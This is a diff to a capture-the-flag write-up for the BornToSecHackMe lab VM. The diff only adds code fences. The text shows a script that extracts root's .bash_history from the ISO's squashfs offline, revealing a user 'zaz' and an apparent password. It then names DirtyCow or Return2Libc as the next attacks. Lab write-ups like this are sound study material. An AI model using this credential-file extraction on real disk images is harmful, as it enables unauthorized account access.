@@ -6,6 +6,9 @@ For that we’ll use pycdlib.
 
 We made a script that allows us to explore the iso :
 
+```bash
+$> source _exploit_iso/bin/activate
+
 (_exploit_iso) ➜  $> ./exploit_iso.py '/' ~/Downloads/BornToSecHackMe-v1.1.iso
 .
 ..
@@ -27,9 +30,11 @@ FILESYSTEM.SIZE;1
 FILESYSTEM.SQUASHFS;1
 INITRD.GZ;1
 README.DISKDE
+```
 
 Then, with the help of SquashFsImage, we extract the bh_history in root :
 
+```bash
 (_exploit_iso) ➜  $> ./exploit_iso.py '/CASPER/FILESYSTEM.SQUASHFS;1' '/root/.bash_history' ~/Downloads/BornToSecHackMe-v1.1.iso
 Extract filesystem.squashfs from the iso ...
 Downloading /root/.bash_history ...
@@ -39,6 +44,7 @@ Downloading /root/.bash_history ...
 adduser zaz
 646da671ca01bb5d84dbb5fb2238dc8e
 …
+```
 
 We have zaz. We can enter zaz and execute a DirtyCow or Return2Libc attack.
 
